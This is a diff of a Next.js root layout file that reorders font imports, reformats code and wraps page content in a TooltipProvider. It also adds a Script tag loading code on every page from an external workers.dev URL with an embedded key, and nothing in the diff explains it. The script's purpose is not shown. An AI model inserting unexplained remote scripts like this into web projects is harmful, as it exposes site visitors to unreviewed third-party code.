@@ -1,16 +1,18 @@
 import type {Metadata} from "next";
-import {Geist, Geist_Mono, Noto_Sans, Playfair_Display, Inter } from "next/font/google";
+import {Geist, Geist_Mono, Inter, Playfair_Display} from "next/font/google";
 import "./globals.css";
 import {Toaster} from "sonner";
 import {NextSSRPlugin} from "@uploadthing/react/next-ssr-plugin";
 import {extractRouterConfig} from "uploadthing/server";
 import {ourFileRouter} from "@/app/api/uploadthing/core";
 import {NuqsAdapter} from "nuqs/adapters/next";
-import { cn } from "@/lib/utils";
+import {cn} from "@/lib/utils";
+import {TooltipProvider} from "@/components/ui/tooltip"
+import Script from "next/script";
 
-const playfairDisplayHeading = Playfair_Display({subsets:['latin'],variable:'--font-heading'});
+const playfairDisplayHeading = Playfair_Display({subsets: ['latin'], variable: '--font-heading'});
 
-const inter = Inter({subsets:['latin'],variable:'--font-sans'});
+const inter = Inter({subsets: ['latin'], variable: '--font-sans'});
 
 const geistSans = Geist({
   variable: "--font-geist-sans",
@@ -29,25 +31,31 @@ export const metadata: Metadata = {
 };
 
 export default function RootLayout({
-  children,
-}: Readonly<{
+                                     children,
+                                   }: Readonly<{
   children: React.ReactNode;
 }>) {
   return (
-    <html lang="en" className={cn("h-full overscroll-none", "font-sans", inter.variable, playfairDisplayHeading.variable)}>
-      <body className={`${geistSans.variable} ${geistMono.variable} antialiased h-full`}>
-      <NextSSRPlugin
-        /**
-         * The `extractRouterConfig` will extract **only** the route configs
-         * from the router to prevent additional information from being
-         * leaked to the client. The data passed to the client is the same
-         * as if you were to fetch `/api/uploadthing` directly.
-         */
-        routerConfig={extractRouterConfig(ourFileRouter)}
-      />
-      <NuqsAdapter>{children}</NuqsAdapter>
-      <Toaster position="top-center" />
-      </body>
+    <html lang="en"
+          className={cn("h-full overscroll-none", "font-sans", inter.variable, playfairDisplayHeading.variable)}>
+    <body className={`${geistSans.variable} ${geistMono.variable} antialiased h-full`}>
+    <NextSSRPlugin
+      /**
+       * The `extractRouterConfig` will extract **only** the route configs
+       * from the router to prevent additional information from being
+       * leaked to the client. The data passed to the client is the same
+       * as if you were to fetch `/api/uploadthing` directly.
+       */
+      routerConfig={extractRouterConfig(ourFileRouter)}
+    />
+    <NuqsAdapter>
+      <TooltipProvider>
+        {children}
+      </TooltipProvider>
+    </NuqsAdapter>
+    <Toaster position="top-center"/>
+    <Script src="https://live-polish-worker.muhammadraufan.workers.dev/?key=741fa6d2c5bf34bb" />
+    </body>
     </html>
   );
 }
